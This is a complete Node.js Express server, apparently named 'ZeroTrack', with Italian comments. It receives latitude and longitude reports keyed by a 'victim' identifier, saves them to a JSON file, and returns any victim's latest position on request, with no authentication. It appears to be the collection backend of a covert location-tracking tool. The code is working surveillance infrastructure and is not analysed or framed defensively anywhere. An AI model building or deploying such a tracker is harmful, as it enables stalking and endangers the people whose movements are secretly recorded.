const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
app.use(express.json());

const STORE_FILE = path.join(__dirname, "store.json");

// Carica store da file (se esiste)
let store = {};
try {
    if (fs.existsSync(STORE_FILE)) {
        store = JSON.parse(fs.readFileSync(STORE_FILE, "utf8"));
    }
} catch (e) {
    console.error("Errore lettura store:", e);
}

function saveStore() {
    try {
        fs.writeFileSync(STORE_FILE, JSON.stringify(store, null, 2));
    } catch (e) {
        console.error("Errore scrittura store:", e);
    }
}

app.post("/", (req, res) => {
    const { victim, lat, lon } = req.body;
    if (victim && lat != null && lon != null) {
        store[victim] = { lat, lon, ts: Date.now() };
        saveStore();
        console.log("Salvato:", victim, lat, lon);
        res.json({ok: true});
    } else {
        res.status(400).json({error: "bad request"});
    }
});

app.get("/", (req, res) => {
    const victim = req.query.victim;
    const data = victim && store[victim];
    if (data) {
        res.json(data);
    } else {
        res.status(404).json({error: "not found"});
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Server persistente ZeroTrack sulla porta ${PORT}`);
});
